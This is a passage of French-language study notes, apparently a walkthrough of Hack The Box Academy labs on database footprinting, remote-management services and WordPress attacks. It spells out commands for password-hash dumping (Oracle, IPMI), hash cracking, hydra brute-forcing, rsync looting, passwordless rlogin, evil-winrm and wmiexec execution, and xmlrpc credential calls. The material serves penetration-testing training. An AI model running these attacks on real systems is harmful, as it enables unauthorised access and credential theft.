<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">"Otto Lang"</span><span class="p">;</span>
</code></pre>
</div>
<p>Ou si le nom est séparé :</p>
<div class="codehilite">
<pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="o">&lt;</span><span class="k">table</span><span class="o">&gt;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">firstname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">"Otto"</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">lastname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ss">"Lang"</span><span class="p">;</span>
</code></pre>
</div>
<p>Récupère le champ <code>email</code>.</p>
<h2>MSSQL</h2>
<h3>Objectifs</h3>
<ul>
<li>Hostname du serveur MSSQL</li>
<li>Nom de la base non par défaut avec <code>backdoor:Password1</code></li>
</ul>
<h3>Méthode</h3>
<p><strong>Scan Nmap MSSQL</strong></p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-p1433<span class="w"> </span>--script<span class="w"> </span>ms-sql-info,ms-sql-ntlm-info<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Tu récupères :</p>
<ul>
<li><code>Windows server name</code> → <strong>hostname</strong></li>
<li>Infos d’instance (MSSQLSERVER, version, etc.)</li>
</ul>
<p><strong>Connexion avec mssqlclient.py</strong></p>
<div class="codehilite">
<pre><span></span><code>python3<span class="w"> </span>mssqlclient.py<span class="w"> </span>backdoor@&lt;IP&gt;<span class="w"> </span>-windows-auth
<span class="c1"># ou si SQL auth :</span>
python3<span class="w"> </span>mssqlclient.py<span class="w"> </span>backdoor:Password1@&lt;IP&gt;
</code></pre>
</div>
<p><strong>Lister les bases</strong></p>
<div class="codehilite">
<pre><span></span><code><span class="k">select</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">databases</span><span class="p">;</span>
</code></pre>
</div>
<p>Tu ignores les bases système (<code>master</code>, <code>model</code>, <code>msdb</code>, <code>tempdb</code>) et tu relèves le <strong>nom de la base non par défaut</strong>.</p>
<h2>Oracle TNS</h2>
<h3>Objectif</h3>
<ul>
<li>Hash du user <code>DBSNMP</code></li>
</ul>
<h3>Méthode</h3>
<p><strong>Scan Nmap TNS</strong></p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-p1521<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>--open
</code></pre>
</div>
<p><strong>Bruteforce du SID</strong></p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-p1521<span class="w"> </span>-sV<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>--script<span class="w"> </span>oracle-sid-brute
</code></pre>
</div>
<p>Tu récupères un SID (souvent <code>XE</code> dans les exemples).</p>
<p><strong>Utiliser ODAT pour trouver des creds</strong></p>
<div class="codehilite">
<pre><span></span><code>./odat.py<span class="w"> </span>all<span class="w"> </span>-s<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Note des couples login/pass valides (par ex. <code>scott/tiger</code>).</p>
<p><strong>Connexion avec sqlplus</strong></p>
<div class="codehilite">
<pre><span></span><code>sqlplus<span class="w"> </span>scott/tiger@&lt;IP&gt;/&lt;SID&gt;
<span class="c1"># ou avec plus de droits</span>
sqlplus<span class="w"> </span>scott/tiger@&lt;IP&gt;/&lt;SID&gt;<span class="w"> </span>as<span class="w"> </span>sysdba
</code></pre>
</div>
<p><strong>Récupérer le hash de DBSNMP</strong></p>
<div class="codehilite">
<pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="k">user</span><span class="err">$</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s1">'DBSNMP'</span><span class="p">;</span>
</code></pre>
</div>
<p>Tu soumets le hash tel quel (format demandé par l’énoncé).</p>
<h2>IPMI</h2>
<h3>Objectifs</h3>
<ul>
<li>Username IPMI</li>
<li>Mot de passe en clair</li>
</ul>
<h3>Méthode</h3>
<p><strong>Scan Nmap IPMI</strong></p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sU<span class="w"> </span>--script<span class="w"> </span>ipmi-version<span class="w"> </span>-p623<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Confirme que IPMI v2.0 tourne sur le port 623/UDP.</p>
<p><strong>Dump des hashes avec Metasploit</strong></p>
<div class="codehilite"><pre><code>use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS &lt;IP&gt;
run

</code></pre></div>
<p>Le module affiche :</p>
<ul>
<li>l’utilisateur (souvent <code>ADMIN</code>)</li>
<li>le hash, et parfois le mot de passe déjà cracké (surtout pour <code>ADMIN</code> / <code>ADMIN</code> ou autre valeur triviale).</li>
</ul>
<ol>
<li><strong>Sinon, cracker le hash (Hashcat m=7300)</strong></li>
</ol>
<p>Si besoin :</p>
<div class="codehilite">
<pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">7300</span><span class="w"> </span>ipmi_hashes.txt<span class="w"> </span>-a<span class="w"> </span><span class="m">3</span><span class="w"> </span>?1?1?1?1?1?1?1?1<span class="w"> </span>-1<span class="w"> </span>?d?u
</code></pre>
</div>
<h1>Recon global</h1>
<p>Avant de se jeter sur SSH/RDP/WinRM, toujours commencer par un scan :</p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Repère surtout :</p>
<ul>
<li><strong>Linux remote mgmt</strong>
<ul>
<li><code>22/tcp</code> → SSH</li>
<li><code>873/tcp</code> → rsync</li>
<li><code>512, 513, 514/tcp</code> → r-services (rexec, rlogin, rsh)</li>
</ul></li>
<li><strong>Windows remote mgmt</strong>
<ul>
<li><code>3389/tcp</code> → RDP</li>
<li><code>5985/tcp</code> → WinRM (HTTP)</li>
<li><code>5986/tcp</code> → WinRM (HTTPS)</li>
<li><code>135/tcp</code> → WMI / DCOM</li>
</ul></li>
</ul>
<p>Ensuite tu affines par service.</p>
<h1>Linux Remote Management</h1>
<h2>SSH</h2>
<h3>a) Footprinting / version</h3>
<p>Scan ciblé :</p>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-p22<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Ou avec <strong>ssh-audit</strong> :</p>
<div class="codehilite">
<pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/jtesta/ssh-audit.git
<span class="nb">cd</span><span class="w"> </span>ssh-audit
./ssh-audit.py<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Tu récupères :</p>
<ul>
<li><strong>Bannière</strong> : <code>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3</code></li>
<li>Version SSH → utile pour chercher d’éventuels CVE</li>
<li>Algo KEX, host keys, ciphers, etc.</li>
</ul>
<h3>Auth methods &amp; brute potentiel</h3>
<p>Teste une connexion verbeuse :</p>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>-v<span class="w"> </span>user@&lt;IP&gt;
</code></pre>
</div>
<p>Regarde la ligne :</p>
<div class="codehilite"><pre><code>Authentications that can continue: publickey,password,keyboard-interactive

</code></pre></div>
<p>Si <code>password</code> est présent → brute-force possible (hydra, etc.).</p>
<p>Pour forcer l’auth password (pratique pour hydra) :</p>
<div class="codehilite">
<pre><span></span><code>ssh<span class="w"> </span>-v<span class="w"> </span>user@&lt;IP&gt;<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password
</code></pre>
</div>
<p>Tu pourras ensuite (en théorie) lancer un bruteforce :</p>
<div class="codehilite">
<pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>wordlist.txt<span class="w"> </span>ssh://&lt;IP&gt;
</code></pre>
</div>
<p><em>(À adapter aux règles du lab / engagement évidemment.)</em></p>
<h3>c) Points de config “dangereux” (côté théorie / exam)</h3>
<p>Dans <code>/etc/ssh/sshd_config</code>, les options à surveiller :</p>
<ul>
<li><code>PermitRootLogin yes</code></li>
<li><code>PasswordAuthentication yes</code></li>
<li><code>PermitEmptyPasswords yes</code></li>
<li><code>Protocol 1</code></li>
<li><code>X11Forwarding yes</code> (anciennement vulnérable)</li>
<li><code>AllowTcpForwarding yes</code>, <code>PermitTunnel</code> (pivot facile)</li>
</ul>
<p>Dans un vrai audit, tu cherches ces options pour du <strong>hardening</strong> ou des vecteurs d’attaque (brute-force, root login direct, etc.).</p>
<h2>Rsync</h2>
<h3>Détection</h3>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-p873<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Exemple de résultat :</p>
<div class="codehilite"><pre><code>873/tcp open  rsync   (protocol version 31)

</code></pre></div>
<h3>Voir les modules disponibles</h3>
<p>Connexion brute avec <code>nc</code> :</p>
<div class="codehilite">
<pre><span></span><code>nc<span class="w"> </span>-nv<span class="w"> </span>&lt;IP&gt;<span class="w"> </span><span class="m">873</span>
</code></pre>
</div>
<p>Tu verras :</p>
<div class="codehilite"><pre><code>@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev             Dev Tools
@RSYNCD: EXIT

</code></pre></div>
<p>Ici, <code>dev</code> est un <strong>module</strong> (un “share rsync”).</p>
<h3>Lister le contenu d’un module</h3>
<div class="codehilite">
<pre><span></span><code>rsync<span class="w"> </span>-av<span class="w"> </span>--list-only<span class="w"> </span>rsync://&lt;IP&gt;/dev
</code></pre>
</div>
<p>Tu cherches ce genre de choses :</p>
<ul>
<li><code>secrets.yaml</code>, <code>.env</code>, <code>config.php</code></li>
<li>Répertoires <code>.ssh</code> (clé privée, known_hosts, etc.)</li>
<li>Scripts, backups, dumps</li>
</ul>
<h3>Récupérer les fichiers</h3>
<div class="codehilite">
<pre><span></span><code>rsync<span class="w"> </span>-av<span class="w"> </span>rsync://&lt;IP&gt;/dev<span class="w"> </span>./loot_rsync
</code></pre>
</div>
<p>Puis tu fouilles localement.</p>
<p>Souvent, un rsync mal configuré → fuite de clés SSH → accès SSH → escalade.</p>
<h2>R-Services (rexec, rlogin, rsh)</h2>
<h3>Détection</h3>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-p512,513,514<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Exemple :</p>
<div class="codehilite"><pre><code>512/tcp open  exec?
513/tcp open  login?
514/tcp open  tcpwrapped

</code></pre></div>
<p>Ça indique la présence des <strong>r-services</strong>.</p>
<h3>Comprendre la confiance (hosts.equiv / .rhosts)</h3>
<ul>
<li><code>/etc/hosts.equiv</code> → global (pour tout le système)</li>
<li><code>~user/.rhosts</code> → par utilisateur</li>
</ul>
<p>Syntaxe typique :</p>
<div class="codehilite"><pre><code># /etc/hosts.equiv
pwnbox cry0l1t3

</code></pre></div>
<p>ou :</p>
<div class="codehilite"><pre><code># ~/.rhosts
htb-student     10.0.17.5
+               10.0.17.10
+               +

</code></pre></div>
<p><code>+</code> = wildcard → host/user de conf <strong>ultra dangereuse</strong> (accès sans mot de passe).</p>
<h3>Exploiter avec rlogin / rsh</h3>
<p>Si ton host/IP est “trusted”, tu peux tenter :</p>
<div class="codehilite">
<pre><span></span><code>rlogin<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-l<span class="w"> </span>htb-student
</code></pre>
</div>
<p>Si ça passe, tu as un shell <strong>sans mot de passe</strong> 👀</p>
<h3>Enum des utilisateurs loggés</h3>
<p>Une fois sur la machine (ou depuis ton réseau si les services sont actifs) :</p>
<div class="codehilite">
<pre><span></span><code>rwho
rusers<span class="w"> </span>-al<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Tu obtiens :</p>
<ul>
<li>utilisateurs</li>
<li>hosts sur lesquels ils sont connectés</li>
<li>TTY, heure de login</li>
</ul>
<p>C’est précieux pour de la <strong>lateral movement</strong> et de l’énumération d’AD.</p>
<h1>Windows Remote Management</h1>
<h2>RDP (3389)</h2>
<h3>Footprinting avec Nmap</h3>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p3389<span class="w"> </span>--script<span class="w"> </span>rdp*<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Tu récupères :</p>
<ul>
<li><code>Target_Name</code> / <code>DNS_Computer_Name</code> → hostname (ex: <code>ILF-SQL-01</code>)</li>
<li><code>Product_Version</code> → version Windows (ex: <code>10.0.17763</code>)</li>
<li>Info de sécurité RDP (NLA/CredSSP activé ou pas)</li>
</ul>
<h3>rdp-sec-check (optionnel mais stylé)</h3>
<div class="codehilite">
<pre><span></span><code>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/CiscoCXSecurity/rdp-sec-check.git
<span class="nb">cd</span><span class="w"> </span>rdp-sec-check
./rdp-sec-check.pl<span class="w"> </span>&lt;IP&gt;
</code></pre>
</div>
<p>Ça te dit :</p>
<ul>
<li>quels protocoles RDP sont supportés</li>
<li>si RDP Security (ancien) est activé</li>
<li>si TLS / CredSSP obligatoire (NLA)</li>
</ul>
<h3>Connexion avec xfreerdp</h3>
<p>Si tu as des creds :</p>
<div class="codehilite">
<pre><span></span><code>xfreerdp<span class="w"> </span>/u:USER<span class="w"> </span>/p:<span class="s2">"PASSWORD"</span><span class="w"> </span>/v:&lt;IP&gt;
</code></pre>
</div>
<p>Tu verras possiblement une alerte cert :</p>
<ul>
<li>CN = nom du serveur (<code>ILF-SQL-01</code>)</li>
<li>Cert self-signed → classique</li>
</ul>
<p>Une fois accepté → bureau à distance = pivot graphique.</p>
<h2>WinRM (5985 / 5986)</h2>
<h3>Détection</h3>
<div class="codehilite">
<pre><span></span><code>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p5985,5986<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>--disable-arp-ping<span class="w"> </span>-n
</code></pre>
</div>
<p>Typique :</p>
<div class="codehilite"><pre><code>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

</code></pre></div>
<h3>Connexion avec evil-winrm</h3>
<p>Avec des identifiants valides (souvent un user de domaine / local avec droits RDP/WinRM) :</p>
<div class="codehilite">
<pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-u<span class="w"> </span>USER<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Password123!'</span>
</code></pre>
</div>
<p>Tu obtiens un prompt PowerShell style :</p>
<div class="codehilite"><pre><code>*Evil-WinRM* PS C:\Users\USER\Documents&gt;

</code></pre></div>
<p>Depuis là tu peux :</p>
<ul>
<li>Énumérer la machine (<code>whoami</code>, <code>hostname</code>, <code>ipconfig</code>, <code>Get-LocalUser</code>, etc.)</li>
<li>Upload / download (<code>upload</code>, <code>download</code>)</li>
<li>Lancer des scripts PowerShell (recon, privesc, etc.)</li>
</ul>
<p>WinRM = <strong>RCE propre</strong> sur Windows.</p>
<h2>WMI (via Impacket)</h2>
<p>WMI communique via :</p>
<ul>
<li><strong>TCP 135</strong> pour init</li>
<li>puis port aléatoire haut (DCOM)</li>
</ul>
<p>Avec des creds valides :</p>
<div class="codehilite">
<pre><span></span><code>python3<span class="w"> </span>/usr/share/doc/python3-impacket/examples/wmiexec.py<span class="w"> </span>USER:<span class="s1">'Password123!'</span>@&lt;IP&gt;<span class="w"> </span><span class="s2">"hostname"</span>
</code></pre>
</div>
<p>Exemple de sortie :</p>
<div class="codehilite"><pre><code>[*] SMBv3.0 dialect used
ILF-SQL-01

</code></pre></div>
<p>Sans commander à la fin, tu peux aussi obtenir un pseudo-shell “semi-interactif” (type cmd).</p>
<p>WMI est utile quand :</p>
<ul>
<li>RDP est filtré / WinRM off</li>
<li>mais SMB + RPC sont accessibles.</li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Hacking WordPress</strong></summary><div class="indented"><h2>Directory Indexing → Trouver <code>flag.txt</code> (question de la page 6)</h2>
<blockquote>
<p>« …Enumérez manuellement la cible pour tous les répertoires dont le contenu peut être listé… localisez un flag nommé flag.txt… »</p>
</blockquote>
<h3>Ce qu’ils veulent que tu apprennes</h3>
<ul>
<li>Connaître les <strong>répertoires clés d’un WordPress</strong> :
<ul>
<li><code>/wp-content/</code></li>
<li><code>/wp-content/plugins/</code></li>
<li><code>/wp-content/themes/</code></li>
<li><code>/wp-content/uploads/</code></li>
<li>Parfois <code>/wp-includes/</code> ou d’autres dossiers exposés</li>
</ul></li>
<li>Vérifier si l’<strong>indexation de répertoire</strong> est activée (pages d’index auto d’Apache)</li>
<li>Parcourir ces répertoires jusqu’à trouver <strong><code>flag.txt</code></strong></li>
</ul>
<h3>Comment faire (navigateur ou CLI)</h3>
<p>On suppose que ta cible est <code>http://TARGET</code> (remplace par l’URL/IP HTB).</p>
<p>Essaie d’afficher les chemins WordPress classiques dans le <strong>navigateur</strong> :</p>
<ul>
<li><code>http://TARGET/wp-content/</code></li>
<li><code>http://TARGET/wp-content/plugins/</code></li>
<li><code>http://TARGET/wp-content/themes/</code></li>
<li><code>http://TARGET/wp-content/uploads/</code></li>
</ul>
<p>Si l’indexation est activée, tu verras une page de type index Apache :</p>
<blockquote>
<p>Index of /wp-content/plugins/</p>
<p>[DIR] some-plugin/</p>
</blockquote>
<p>Fais la même chose en <strong>CLI</strong> avec <code>curl</code> + <code>html2text</code> sur ta box Parrot :</p>
<div class="codehilite">
<pre><span></span><code><span class="c1"># Exemple : énumérer les plugins</span>
curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span>http://TARGET/wp-content/plugins/<span class="w"> </span><span class="p">|</span><span class="w"> </span>html2text

<span class="c1"># Puis descendre dans les répertoires intéressants</span>
curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span>http://TARGET/wp-content/plugins/some-plugin/<span class="w"> </span><span class="p">|</span><span class="w"> </span>html2text
</code></pre>
</div>
<p>Parcours tous les répertoires dont le contenu est listé (plugins, themes, uploads, etc.) jusqu’à tomber sur <code>flag.txt</code> :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span>http://TARGET/wp-content/uploads/<span class="w"> </span><span class="p">|</span><span class="w"> </span>html2text
curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span>http://TARGET/wp-content/uploads/2025/<span class="w"> </span><span class="p">|</span><span class="w"> </span>html2text
<span class="c1"># …continue partout où tu vois des sous-dossiers…</span>
</code></pre>
</div>
<p>Une fois que tu vois <code>flag.txt</code> dans un listing, récupère son contenu :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>http://TARGET/path/to/flag.txt
</code></pre>
</div>
<p>Le <strong>contenu de ce fichier</strong> est la réponse à soumettre.</p>
<h2>Énumération des utilisateurs → User ID 2 (question de la page 7)</h2>
<blockquote>
<p>« À partir de la dernière commande cURL, quel nom d’utilisateur est associé à l’ID utilisateur 2 ? »</p>
</blockquote>
<p>Ils montrent l’exemple d’énumération via l’API JSON :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>http://blog.inlanefreight.com/wp-json/wp/v2/users<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
</code></pre>
</div>
<p>Et un extrait :</p>
<div class="codehilite">
<pre><span></span><code><span class="p">[</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span>
<span class="w">    </span><span class="err">...</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span>
<span class="w">    </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ch4p"</span><span class="p">,</span>
<span class="w">    </span><span class="err">...</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">]</span>
</code></pre>
</div>
<p>Sur <strong>ta</strong> cible, tu fais la même chose :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>http://TARGET/wp-json/wp/v2/users<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
</code></pre>
</div>
<p>Ensuite :</p>
<ul>
<li>Cherche l’objet où <code>"id": 2</code></li>
<li>Lis le champ <code>"name"</code> – cette <strong>valeur est le nom d’utilisateur demandé</strong></li>
</ul>
<p>Dans l’exemple du texte, c’est <code>ch4p</code>, mais sur le lab Academy ça peut être autre chose, donc base-toi sur <em>ton</em> output.</p>
<h2>XML-RPC → « Exécuter tous les appels de méthodes » &amp; les compter (question de la page 8)</h2>
<blockquote>
<p>« Cherchez “WordPress xmlrpc attacks” et trouvez comment l’utiliser pour exécuter tous les appels de méthodes. Indiquez le nombre de méthodes possibles sur votre cible. »</p>
</blockquote>
<p>Cette partie concerne l’abus de <strong><code>xmlrpc.php</code></strong> et des <strong>méthodes XML-RPC</strong> qu’il expose.</p>
<h3>Concepts clés</h3>
<ul>
<li><code>xmlrpc.php</code> implémente un tas de méthodes comme :
<ul>
<li><code>wp.getUsersBlogs</code></li>
<li><code>wp.getPosts</code></li>
<li><code>system.listMethods</code></li>
<li><code>system.multicall</code> (permet d’exécuter plusieurs appels en une seule requête)</li>
</ul></li>
</ul>
<p>L’idée ici est :</p>
<ol>
<li>Interroger XML-RPC pour la liste de <strong>toutes les méthodes supportées</strong></li>
<li>Les compter</li>
<li>Utiliser ce nombre comme réponse</li>
</ol>
<h3>Étape 1 – Vérifier que <code>xmlrpc.php</code> est accessible</h3>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-I<span class="w"> </span>http://TARGET/xmlrpc.php
</code></pre>
</div>
<p>Si c’est activé, tu auras un <code>200 OK</code> ou une réponse XML-RPC spécifique.</p>
<h3>Étape 2 – Lister toutes les méthodes</h3>
<p>Utilise la méthode intégrée <code>system.listMethods</code> :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://TARGET/xmlrpc.php<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">'&lt;?xml version="1.0"?&gt;</span>
<span class="s1">  &lt;methodCall&gt;</span>
<span class="s1">    &lt;methodName&gt;system.listMethods&lt;/methodName&gt;</span>
<span class="s1">    &lt;params&gt;&lt;/params&gt;</span>
<span class="s1">  &lt;/methodCall&gt;'</span>
</code></pre>
</div>
<p>Tu obtiendras une réponse XML contenant toutes les méthodes supportées dans un bloc <code>&lt;array&gt;&lt;data&gt;...&lt;/data&gt;&lt;/array&gt;</code>.</p>
<p>Pour faciliter le comptage :</p>
<div class="codehilite">
<pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://TARGET/xmlrpc.php<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">'&lt;?xml version="1.0"?&gt;</span>
<span class="s1">  &lt;methodCall&gt;</span>
<span class="s1">    &lt;methodName&gt;system.listMethods&lt;/methodName&gt;</span>
<span class="s1">    &lt;params&gt;&lt;/params&gt;</span>
<span class="s1">  &lt;/methodCall&gt;'</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">'&lt;string&gt;.*&lt;/string&gt;'</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="p">|</span><span class="w"> </span>wc<span class="w"> </span>-l
</code></pre>
</div>
<ul>
<li>Le résultat de <code>wc -l</code> est ton <strong>« nombre d’appels de méthodes possibles »</strong> pour cette cible.</li>
</ul>
<h3>Étape 3 – « Exécuter tous les appels de méthodes »</h3>
<p>La phrase « l’utiliser pour exécuter tous les appels de méthodes » fait en général référence à <strong><code>system.multicall</code></strong>, qui permet d’envoyer plusieurs appels de méthodes dans une seule requête. Conceptuellement :</p>
<div class="codehilite">
<pre><span></span><code><span class="nt">&lt;methodCall&gt;</span>
<span class="w">  </span><span class="nt">&lt;methodName&gt;</span>system.multicall<span class="nt">&lt;/methodName&gt;</span>
<span class="w">  </span><span class="nt">&lt;params&gt;</span>
<span class="w">    </span><span class="nt">&lt;param&gt;</span>
<span class="w">      </span><span class="nt">&lt;value&gt;</span>
<span class="w">        </span><span class="nt">&lt;array&gt;</span>
<span class="w">          </span><span class="nt">&lt;data&gt;</span>
<span class="w">            </span><span class="nt">&lt;value&gt;</span>
<span class="w">              </span><span class="nt">&lt;struct&gt;</span>
<span class="w">                </span><span class="nt">&lt;member&gt;</span>
<span class="w">                  </span><span class="nt">&lt;name&gt;</span>methodName<span class="nt">&lt;/name&gt;</span>
<span class="w">                  </span><span class="nt">&lt;value&gt;&lt;string&gt;</span>wp.getUsersBlogs<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
<span class="w">                </span><span class="nt">&lt;/member&gt;</span>
<span class="w">                </span><span class="nt">&lt;member&gt;</span>
<span class="w">                  </span><span class="nt">&lt;name&gt;</span>params<span class="nt">&lt;/name&gt;</span>
<span class="w">                  </span><span class="nt">&lt;value&gt;</span>
<span class="w">                    </span><span class="nt">&lt;array&gt;</span>
<span class="w">                      </span><span class="nt">&lt;data&gt;</span>
<span class="w">                        </span><span class="nt">&lt;value&gt;&lt;string&gt;</span>username<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
<span class="w">                        </span><span class="nt">&lt;value&gt;&lt;string&gt;</span>password<span class="nt">&lt;/string&gt;&lt;/value&gt;</span>
<span class="w">                      </span><span class="nt">&lt;/data&gt;</span>
<span class="w">                    </span><span class="nt">&lt;/array&gt;</span>
<span class="w">                  </span><span class="nt">&lt;/value&gt;</span>
<span class="w">                </span><span class="nt">&lt;/member&gt;</span>
<span class="w">              </span><span class="nt">&lt;/struct&gt;</span>
<span class="w">            </span><span class="nt">&lt;/value&gt;</span>
<span class="w">            </span><span class="cm">&lt;!-- Ajouter d’autres structures de méthodes ici --&gt;</span>
<span class="w">          </span><span class="nt">&lt;/data&gt;</span>
<span class="w">        </span><span class="nt">&lt;/array&gt;</span>
<span class="w">      </span><span class="nt">&lt;/value&gt;</span>
<span class="w">    </span><span class="nt">&lt;/param&gt;</span>
<span class="w">  </span><span class="nt">&lt;/params&gt;</span>
<span class="nt">&lt;/methodCall&gt;</span>
</code></pre>
</div>
<p>Tu n’es pas obligé de vraiment exécuter toutes les méthodes pour répondre à la question ; ils veulent surtout que tu :</p>
<ul>
<li>Saches que <code>system.listMethods</code> existe</li>
<li>Saches que <code>system.multicall</code> existe et peut chaîner plusieurs méthodes</li>
<li>Utilises <code>system.listMethods</code> pour compter les méthodes</li>
</ul>
<h2>WPScan → Version du plugin vulnérable <code>photo-gallery</code> (question de la page 10)</h2>
<blockquote>
<p>« Énumérez l’instance WordPress fournie pour tous les plugins installés… soumettez la version du plugin vulnérable nommé photo-gallery. »</p>
</blockquote>
<h3>Étape 1 – Configurer le token API WPScan (si nécessaire)</h3>
<ol>
<li>Crée un compte sur wpscan.com / wpvulndb.com</li>
<li>Récupère ton <strong>API token</strong></li>
<li>Sur Parrot, WPScan est déjà installé. Vérifie :
<div class="codehilite">
<pre><span></span><code>wpscan<span class="w"> </span>--hh
</code></pre>
</div></li>
</ol>
<h3>Étape 2 – Lancer l’énumération des plugins sur la cible</h3>
<p>Utilise l’URL HTB à la place de l’exemple :</p>
<div class="codehilite">
<pre><span></span><code>wpscan<span class="w"> </span>--url<span class="w"> </span>http://TARGET<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>--enumerate<span class="w"> </span>ap<span class="w"> </span><span class="se">\</span>
<span class="w">       </span>--api-token<span class="w"> </span>YOUR_API_TOKEN
</code></pre>
</div>
<ul>
<li><code>-enumerate ap</code> = <strong>tous les plugins</strong></li>
<li>Tu peux ajouter <code>t 10</code> pour plus de threads :
<div class="codehilite">
<pre><span></span><code>wpscan<span class="w"> </span>--url<span class="w"> </span>http://TARGET<span class="w"> </span>--enumerate<span class="w"> </span>ap<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span>--api-token<span class="w"> </span>YOUR_API_TOKEN
</code></pre>
</div></li>
</ul>
<h3>Étape 3 – Trouver <code>photo-gallery</code> dans la sortie</h3>
<p>Dans les résultats, tu verras des blocs du style :</p>
<div class="codehilite"><pre><code>[+] photo-gallery
 | Location: http://TARGET/wp-content/plugins/photo-gallery/
